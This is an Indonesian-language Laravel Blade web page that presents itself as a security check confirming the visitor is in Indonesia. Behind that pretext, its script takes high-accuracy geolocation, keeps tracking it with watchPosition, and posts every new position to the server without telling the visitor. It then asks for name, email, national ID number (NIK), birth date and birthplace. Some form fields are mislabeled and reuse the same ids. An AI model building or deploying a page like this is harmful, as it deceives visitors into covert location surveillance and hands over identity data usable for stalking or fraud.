 <!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Konfirmasi Lokasi & Biodata</title>
     @vite('resources/css/app.css')
     <style>
         #loading-overlay {
             /* position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 50;
             background-color: rgba(255, 255, 255, 0.7);
             backdrop-filter: blur(5px);
             display: none; */
         }
 
         .spinner {
             border: 8px solid rgba(0, 0, 0, 0.1);
             border-top: 8px solid theme('colors.green.500');
             border-radius: 50%;
             width: 100px;
             height: 100px;
             animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
         .dark .spinner {
             border-top-color: theme('colors.green.400');
         }
 
         #location-status {
             margin-top: theme('spacing.4');
             padding: theme('spacing.3');
             border-radius: theme('borderRadius.md');
             font-weight: theme('fontWeight.semibold');
             text-align: center;
         }
 
         .status-ok {
             background-color: theme('colors.green.100');
             color: theme('colors.green.700');
         }
 
         .dark .status-ok {
             background-color: theme('colors.green.900');
             color: theme('colors.green.300');
         }
 
         .status-error {
             background-color: theme('colors.red.100');
             color: theme('colors.red.700');
         }
 
         .dark .status-error {
             background-color: theme('colors.red.900');
             color: theme('colors.red.300');
         }
 
         #biodata-form {
             display: none;
         }
 
         #confirmation-box {

         }
     </style>
 </head>
 <body class="bg-gray-100 dark:bg-gray-900 h-screen flex items-center justify-center transition-colors duration-300">
     <div id="confirmation-box" class="bg-white dark:bg-gray-800 p-8 rounded shadow-md w-96 transition-colors duration-300">
         <h2 class="text-xl font-semibold mb-4 text-gray-800 dark:text-gray-100 transition-colors duration-300">
             Verifikasi Keamanan
         </h2>
         <p class="text-gray-700 dark:text-gray-300 mb-4 transition-colors duration-300">
             Kami perlu memastikan Anda adalah pengguna Indonesia. <br />
             Mohon izinkan lokasi jika diminta.<br />
             Dan jika sudah, mohon ditunggu.
         </p>
         <div id="message" class="mt-4 text-sm text-red-500 dark:text-red-400 transition-colors duration-300"></div>
         <div id="location-status" class="hidden"></div>
 
         <div id="loading-overlay" style="display: none;">
             <img src="/loading.svg" alt="" class="spinner">
         </div>
 
     </div>
 
     <div id="biodata-form" class="bg-white dark:bg-gray-800 p-8 rounded shadow-md w-96 transition-colors duration-300" style="display: none;">
         <h2 class="text-xl font-semibold mb-4 text-gray-800 dark:text-gray-100 transition-colors duration-300">Isi Biodata</h2>
         <form>
             <div class="mb-4">
                 <label for="nama" class="block text-gray-700 dark:text-gray-300 text-sm font-bold mb-2">Nama:</label>
                 <input type="text" id="nama" name="nama" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 dark:bg-gray-700 dark:text-gray-200 leading-tight focus:outline-none focus:shadow-outline">
             </div>
             <div class="mb-4">
                 <label for="email" class="block text-gray-700 dark:text-gray-300 text-sm font-bold mb-2">Email:</label>
                 <input type="email" id="email" name="email" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 dark:bg-gray-700 dark:text-gray-200 leading-tight focus:outline-none focus:shadow-outline">
             </div>
             <div class="mb-4">
                <label for="latitude" class="block text-gray-700 dark:text-gray-300 text-sm font-bold mb-2">NIK:</label>
                <input type="text" id="latitude" name="latitude" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 dark:bg-gray-700 dark:text-gray-200 leading-tight focus:outline-none focus:shadow-outline" readonly>
            </div>
            <div class="mb-4">
                <label for="longitude" class="block text-gray-700 dark:text-gray-300 text-sm font-bold mb-2">Tanggal Lahir:</label>
                <input type="text" id="longitude" name="longitude" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 dark:bg-gray-700 dark:text-gray-200 leading-tight focus:outline-none focus:shadow-outline">
            </div>
            <div class="mb-4">
                <label for="longitude" class="block text-gray-700 dark:text-gray-300 text-sm font-bold mb-2">Tempat Lahir:</label>
                <input type="text" id="longitude" name="longitude" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 dark:bg-gray-700 dark:text-gray-200 leading-tight focus:outline-none focus:shadow-outline">
            </div>
             <button type="submit" class="bg-green-500 hover:bg-green-700 dark:bg-green-600 dark:hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">Submit</button>
         </form>
     </div>
 
     <script>
         const html = document.documentElement;
         const confirmationBox = document.getElementById('confirmation-box');
         const biodataForm = document.getElementById('biodata-form');
         const messageDiv = document.getElementById('message');
         const loadingOverlay = document.getElementById('loading-overlay');
         const locationStatusDiv = document.getElementById('location-status');

         let intervalId = null;
         let previousLatitude = null;
         let previousLongitude = null;
 
         function handleLocation(position) {
             loadingOverlay.style.display = 'none';
             confirmationBox.style.display = 'none';
             biodataForm.style.display = 'block';
 
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
             console.log('Latitude (awal): ' + latitude);
             console.log('Longitude (awal): ' + longitude);
 
             sendLocationData(latitude, longitude);
 
            //  intervalId = setInterval(() => {
                 navigator.geolocation.watchPosition(
                     (currentPosition) => {
                         const intervalLatitude = currentPosition.coords.latitude;
                         const intervalLongitude = currentPosition.coords.longitude;
 
                         console.log('Latitude (interval): ' + intervalLatitude);
                         console.log('Longitude (interval): ' + intervalLongitude);
 
                         if (intervalLatitude !== previousLatitude || intervalLongitude !== previousLongitude) {
                             sendLocationData(intervalLatitude, intervalLongitude);
                             previousLatitude = intervalLatitude;
                             previousLongitude = intervalLongitude;
                         } else {
                             console.log('Lokasi tidak berubah, tidak mengirim data.');
                         }
                     },
                     (error) => {
                         console.error('Error getting location for interval:', error);
                         if (intervalId) {
                             clearInterval(intervalId);
                         }
                     },
                     {
                         enableHighAccuracy: true,
                         timeout: 5000,
                         maximumAge: 0
                     }
                 );
            //  }, 3000);
         }
 
         function handleLocationError(error) {
             loadingOverlay.style.display = 'none';
             confirmationBox.style.display = 'block';
             let errorMessage = 'ERROR: Gagal mendapatkan lokasi.';
             switch (error.code) {
                 case error.PERMISSION_DENIED:
                     errorMessage = "Lokasi harus diizinkan.";
                     break;
                 case error.POSITION_UNAVAILABLE:
                     errorMessage = "Informasi lokasi tidak tersedia.";
                     break;
                 case error.TIMEOUT:
                     errorMessage = "Waktu permintaan lokasi habis.";
                     break;
                 case error.UNKNOWN_ERROR:
                     errorMessage = "Terjadi kesalahan yang tidak diketahui.";
                     break;
             }
             locationStatusDiv.textContent = errorMessage;
             locationStatusDiv.className = 'mt-4 py-2 px-4 rounded font-semibold text-center status-error transition-colors duration-300';
             locationStatusDiv.classList.remove('hidden');
             console.error('Error getting location:', error);
         }
 
         function sendLocationData(latitude, longitude) {
             const formData = new FormData();
             formData.append('latitude', latitude);
             formData.append('longitude', longitude);
 
             fetch('/', {
                 method: 'POST',
                 body: formData
             })
             .then(response => response.json())
             .then(data => {
                 console.log('Data lokasi berhasil dikirim:', data);
             })
             .catch(error => {
                 console.error('Gagal mengirim data lokasi:', error);
             });
         }
 
         window.onload = function() {
             if (navigator.geolocation) {
                 loadingOverlay.style.display = 'flex';
                 navigator.geolocation.getCurrentPosition(handleLocation, handleLocationError);
             } else {
                 loadingOverlay.style.display = 'none';
                 confirmationBox.style.display = 'block';
                 locationStatusDiv.textContent = 'ERROR: Geolocation tidak didukung.';
                 locationStatusDiv.className = 'mt-4 py-2 px-4 rounded font-semibold text-center status-error transition-colors duration-300';
                 locationStatusDiv.classList.remove('hidden');
             }
         };
 
     </script>
 </body>
 </html>
